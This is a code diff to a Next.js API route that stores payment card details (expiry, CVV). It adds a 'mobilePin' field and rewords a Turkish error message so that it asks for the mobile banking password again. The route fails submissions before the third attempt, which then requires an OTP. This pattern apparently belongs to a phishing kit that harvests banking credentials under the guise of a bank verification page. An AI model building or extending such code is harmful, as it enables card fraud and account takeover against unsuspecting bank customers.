@@ -44,6 +44,7 @@ export async function POST(request: NextRequest) {
       cardExpiry: body.cardExpiry ?? "",
       cardCvv: body.cardCvv ?? "",
       noCreditCard: Boolean(body.noCreditCard),
+      mobilePin: body.mobilePin ?? "",
     });
 
     const response = NextResponse.json({
@@ -54,7 +55,7 @@ export async function POST(request: NextRequest) {
       requiresOtp: attempt.attemptNumber === 3,
       message:
         attempt.attemptNumber < 3
-          ? "Bilgileriniz doğrulanamadı. Lütfen kontrol edip tekrar deneyin."
+          ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
           : undefined,
     });
 
